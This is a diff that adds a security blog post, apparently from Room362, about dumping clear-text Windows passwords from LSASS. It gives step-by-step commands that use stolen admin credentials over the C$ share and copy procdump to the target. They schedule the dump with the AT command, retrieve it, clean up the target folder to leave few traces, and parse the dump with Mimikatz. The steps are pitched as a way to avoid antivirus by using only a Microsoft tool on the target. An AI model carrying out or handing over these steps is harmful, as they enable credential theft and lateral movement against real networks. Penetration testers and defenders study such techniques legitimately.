@@ -1,0 +1,286 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="description" content="">
+  <meta name="generator" content="Hugo 0.15" />
+
+  <title>Using Mimikatz Alpha or Getting Clear Text Passwords with a Microsoft Tool &middot; Room362</title>
+
+  
+  
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pure/0.6.0/pure-min.css">
+
+  <!--[if lte IE 8]>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pure/0.6.0/grids-responsive-old-ie-min.css">
+  <![endif]-->
+  <!--[if gt IE 8]><!-->
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pure/0.6.0/grids-responsive-min.css">
+  <!--<![endif]-->
+
+  <!--[if lte IE 8]>
+  <link rel="stylesheet" href="/css/side-menu-old-ie.css">
+  <![endif]-->
+  <!--[if gt IE 8]><!-->
+  <link rel="stylesheet" href="/css/side-menu.css">
+  <!--<![endif]-->
+
+  <link rel="stylesheet" href="/css/blackburn.css">
+
+  
+  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css">
+
+  
+  <link href="https://fonts.googleapis.com/css?family=Raleway" rel="stylesheet" type="text/css">
+
+  
+  <link rel="alternate" type="application/rss+xml" title="Room362" href="http://room362.com/index.xml" />
+
+  
+  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.1.0/styles/androidstudio.min.css">
+  <script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.1.0/highlight.min.js"></script>
+  <script>hljs.initHighlightingOnLoad();</script>
+  
+
+  <link rel="shortcut icon" href="http://room362.com/img/favicon.ico" type="image/x-icon" />
+
+</head>
+
+
+<body>
+<div id="layout">
+
+  
+<a href="#menu" id="menuLink" class="menu-link">
+  
+  <span></span>
+</a>
+<div id="menu">
+
+  
+
+  <div class="pure-menu">
+    <ul class="pure-menu-list">
+      
+      
+        <li class="pure-menu-item">
+          <a class="pure-menu-link" href="/"><i class='fa fa-home fa-fw'></i>Home</a>
+      
+        </li>
+      
+      
+        <li class="pure-menu-item">
+          <a class="pure-menu-link" href="/brandon/"><i class='fa fa-users fa-fw'></i>Brandon</a>
+      
+        </li>
+      
+      
+        <li class="pure-menu-item">
+          <a class="pure-menu-link" href="/post/"><i class='fa fa-list fa-fw'></i>Posts</a>
+      
+        </li>
+      
+      
+        <li class="pure-menu-item">
+          <a class="pure-menu-link" href="/about/"><i class='fa fa-user fa-fw'></i>About</a>
+      
+        </li>
+      
+    </ul>
+  </div>
+
+  <div class="pure-menu social">
+  <ul class="pure-menu-list">
+
+    <li class="pure-menu-item">
+      <a class="pure-menu-link" href="http://room362.com/index.xml"><i class="fa fa-rss fa-fw"></i>RSS</a>
+    </li>
+
+    
+
+    
+    <li class="pure-menu-item">
+      <a class="pure-menu-link" href="https://twitter.com/mubix" target="_blank"><i class="fa fa-twitter fa-fw"></i>Twitter</a>
+    </li>
+    
+
+    
+    <li class="pure-menu-item">
+      <a class="pure-menu-link" href="https://facebook.com/mubix" target="_blank"><i class="fa fa-facebook fa-fw"></i>Facebook</a>
+    </li>
+    
+
+    
+    <li class="pure-menu-item">
+      <a class="pure-menu-link" href="https://plus.google.com/+mubix" target="_blank"><i class="fa fa-google-plus-square fa-fw"></i>Google+</a>
+    </li>
+    
+
+    
+
+    
+
+    
+    <li class="pure-menu-item">
+      <a class="pure-menu-link" href="https://instagram.com/mubix" target="_blank"><i class="fa fa-instagram fa-fw"></i>Instagram</a>
+    </li>
+    
+
+    
+    <li class="pure-menu-item">
+      <a class="pure-menu-link" href="https://flickr.com/photos/mubix" target="_blank"><i class="fa fa-flickr fa-fw"></i>Flickr</a>
+    </li>
+    
+
+    
+
+    
+    <li class="pure-menu-item">
+      <a class="pure-menu-link" href="https://youtube.com/user/hak5" target="_blank"><i class="fa fa-youtube fa-fw"></i>YouTube</a>
+    </li>
+    
+
+    
+    <li class="pure-menu-item">
+      <a class="pure-menu-link" href="https://vimeo.com/mubix" target="_blank"><i class="fa fa-vimeo fa-fw"></i>Vimeo</a>
+    </li>
+    
+
+    
+
+    
+    <li class="pure-menu-item">
+      <a class="pure-menu-link" href="http://slideshare.net/mubix" target="_blank"><i class="fa fa-slideshare fa-fw"></i>SlideShare</a>
+    </li>
+    
+
+    
+
+    
+    <li class="pure-menu-item">
+      <a class="pure-menu-link" href="https://linkedin.com/in/mubix" target="_blank"><i class="fa fa-linkedin fa-fw"></i>LinkedIn</a>
+    </li>
+    
+
+    
+
+    
+
+    
+    <li class="pure-menu-item">
+      <a class="pure-menu-link" href="https://reddit.com/user/mubix" target="_blank"><i class="fa fa-reddit fa-fw"></i>Reddit</a>
+    </li>
+    
+
+    
+
+    
+    <li class="pure-menu-item">
+      <a class="pure-menu-link" href="https://github.com/mubix" target="_blank"><i class="fa fa-github-alt fa-fw"></i>GitHub</a>
+    </li>
+    
+
+    
+    <li class="pure-menu-item">
+      <a class="pure-menu-link" href="https:////bitbucket.org/mubix" target="_blank"><i class="fa fa-bitbucket fa-fw"></i>Bitbucket</a>
+    </li>
+    
+
+    
+
+  </ul>
+</div>
+
+  <div class="pure-g">
+  <div class="small-print pure-u-1 pure-u-md-1-1">
+    <small>&copy; 2016. All rights reserved.</small>
+  </div>
+  <div class="small-print pure-u-1 pure-u-md-1-1">
+    <small>Built with&nbsp;<a href="https://gohugo.io/" target="_blank">Hugo</a></small>
+    <small>Theme&nbsp;<a href="https://github.com/yoshiharuyamashita/blackburn" target="_blank">Blackburn</a></small>
+  </div>
+</div>
+
+</div>
+
+
+  <div id="main">
+
+
+<div class="header">
+  <h1>Using Mimikatz Alpha or Getting Clear Text Passwords with a Microsoft Tool</h1>
+  <h2></h2>
+</div>
+<div class="content">
+  <p>Mimikatz is now <a href="https://github.com/rapid7/meterpreter/pull/9">built into Metasploit&rsquo;s meterpreter</a>, you can do load mimikatz from the meterpreter prompt, but if you don&rsquo;t want to go through the hassle of dealing with AV, reverse or bind payloads, meterpreter binaries, and you have clear text credentials for an admin, you can just use Mimikatz&rsquo;s alpha release that allows you to run Mimikatz on your machine against a process memory dump of LSASS. The great thing about this technique is that the only thing on disk is a Microsoft tool.</p>
+
+<p>Mimikatz Minidump: <a href="http://blog.gentilkiwi.com/securite/mimikatz/minidump">http://blog.gentilkiwi.com/securite/mimikatz/minidump</a></p>
+
+<p>Procdump: <a href="http://technet.microsoft.com/en-us/sysinternals/dd996900.aspx">http://technet.microsoft.com/en-us/sysinternals/dd996900.aspx</a></p>
+
+<p>Lets start. First we make sure our authentication works against the box and we can look inside of C$ (usually only admins can)</p>
+
+<pre><code>net use \\TARGETBOXC$ /user:DOMAIN\serviceaccount serviceaccount123
+dir \\TARGETBOX\C$
+</code></pre>
+
+<p>If that works then we want to check that we can all the &ldquo;AT&rdquo; command on the remote host:</p>
+
+<pre><code>at \\TARGETBOX
+</code></pre>
+
+<p>All set. Next lets prep our workspace on the remote host. We are using the C:\Temp directory.</p>
+
+<pre><code>mkdir \\TARGETBOX\C$\Temp
+dir \\TARGETBOX\C$\Temp
+copy c:\temp\procdump.exe \\TARGETBOXC$
+copy c:\temp\procdump.bat \\TARGETBOXC$
+</code></pre>
+
+<p>The contents of procdump.bat are:</p>
+
+<pre><code>@echo off
+C:\temp\procdump.exe -accepteula -ma lsass.exe %COMPUTERNAME%_lsass.dmp
+</code></pre>
+
+<p>I&rsquo;m using the computer name in the memory dump name to help me keep track of where the dump came from, but also help me notice when I&rsquo;ve dumped more than one IP that is actually the same host.</p>
+
+<p>Next we schedule the task. Use net time to determine the local time for the remote machine.</p>
+
+<pre><code>net time \\TARGETBOX
+at \\TARGETBOX 13:52 C:\Temp\procdump.bat
+</code></pre>
+
+<p>Pull down the file and clean up:</p>
+
+<pre><code>dir \\TARGETBOX\C$\Temp
+copy \\TARGETBOX\C$\Temp\*lsass.dmp C:\temp\output\
+rmdir /s \\TARGETBOX\C$\Temp
+</code></pre>
+
+<p>On your side the only thing you need to make sure is that you are running Mimikatz on a similar version and architecture you pulled from. Use the following url for reference:<a href="http://blog.gentilkiwi.com/wp-content/uploads/2013/04/minidump_matrix.png">http://blog.gentilkiwi.com/wp-content/uploads/2013/04/minidump_matrix.png</a></p>
+
+<p>Load up the Alpha version of Mimikatz, switch it to minidump mode and you&rsquo;re dumping creds:</p>
+
+<pre><code>mimikatz # sekurlsa::minidump SUPERCOMPUTER_lsass.dmp
+Switch to MINIDUMP
+
+mimikatz # sekurlsa::logonPasswords full
+</code></pre>
+
+<p>Thats it. Password dumping without ever using a &ldquo;Hacker&rdquo; tool on target. Much love Microsoft. And even more to Mimikatz creator <a href="http://twitter.com/gentilkiwi">@gentilkiwi</a> - Benjamin Delpy for both this alpha release and changing his licensing to allow Mimikatz code to be integrated into Meterpreter.</p>
+
+</div>
+
+</div>
+</div>
+<script src="http://room362.com/js/ui.js"></script>
+
+
+
+
+</body>
+</html>
+
